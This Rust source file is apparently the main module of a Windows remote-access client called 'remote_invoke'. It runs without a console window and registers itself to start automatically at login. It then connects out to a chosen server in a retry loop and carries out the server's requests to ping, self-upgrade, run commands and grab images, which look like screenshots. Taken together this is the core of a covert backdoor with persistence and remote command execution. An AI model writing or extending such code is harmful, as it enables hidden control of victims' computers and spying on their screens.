#![windows_subsystem = "windows"]

use std::env::current_exe;
use std::time::Duration;
use anyhow::{anyhow, Result};
use auto_launch::AutoLaunch;
use tokio::time::sleep;
use bytes::Buf;
use lazy_static::lazy_static;
use tokio::net::TcpStream;
use variable_len_reader::str::read_string;
use crate::links::try_select_link;
use crate::network::{recv, send, send_err};

mod links;
mod upgrade;
mod image_grab;
mod command;
mod network;
mod ping;

lazy_static! {
    pub static ref AUTO_LAUNCHER: Result<AutoLaunch> = {
        let name = "remote_invoke";
        let path = current_exe()?;
        let path = path.to_str().ok_or(anyhow!("failed to get current exe"))?;
        Ok(AutoLaunch::new(name, path, &[] as &[&str]))
    };
}

#[tokio::main]
async fn main() {
    loop {
        if let Ok(launcher) = AUTO_LAUNCHER.as_ref() {
            if match launcher.is_enabled() { Ok(success) => !success, Err(_) => true, } {
                let _ = launcher.enable();
            }
        }
        if main_loop().await.is_ok() {
            break;
        }
        sleep(Duration::from_secs(10)).await;
    }
}

async fn main_loop() -> Result<()> {
    let mut stream = if true {
        let stream = try_select_link().await?;
        if stream.is_none() {
            return Err(anyhow!("No available server link."));
        }
        stream.unwrap()
    } else {
        TcpStream::connect("127.0.0.1:25565").await?
    };
    loop {
        let mut request = recv(&mut stream).await?.reader();
        let function = read_string(&mut request)?;
        let response = match &function as &str {
            "ping" => ping::ping(&mut request).await,
            "upgrade" => upgrade::upgrade(&mut request).await,
            "command" => command::command(&mut request).await,
            "image_grab" => image_grab::image_grab(&mut request).await,
            _ => Err(anyhow!("Unknown function."))?,
        };
        match response.as_ref() {
            Ok(r) => { send(&mut stream, r).await }
            Err(e) => { send_err(&mut stream, &format!("{:?}", e)).await }
        }?;
        if function == "upgrade" && response.is_ok() {
            break;
        }
    }
    Ok(())
}
